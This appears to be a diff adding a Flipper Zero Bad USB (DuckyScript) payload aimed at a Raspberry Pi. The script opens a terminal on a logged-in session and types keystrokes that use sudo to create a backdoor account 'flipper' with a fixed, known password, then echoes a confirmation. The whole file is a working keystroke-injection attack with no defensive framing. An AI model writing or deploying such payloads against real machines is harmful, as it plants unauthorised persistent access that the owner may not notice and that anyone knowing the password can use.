@@ -1,0 +1,11 @@
+REM Flipper Zero Bad USB — add a backdoor user to the Pi
+REM Requires the terminal to open with a logged-in user that has sudo.
+
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+STRING sudo useradd -m -s /bin/bash flipper && echo "flipper:flipper123" | sudo chpasswd
+ENTER
+DELAY 500
+STRING echo "[FLIPPER] backdoor user added: flipper / flipper123"
+ENTER
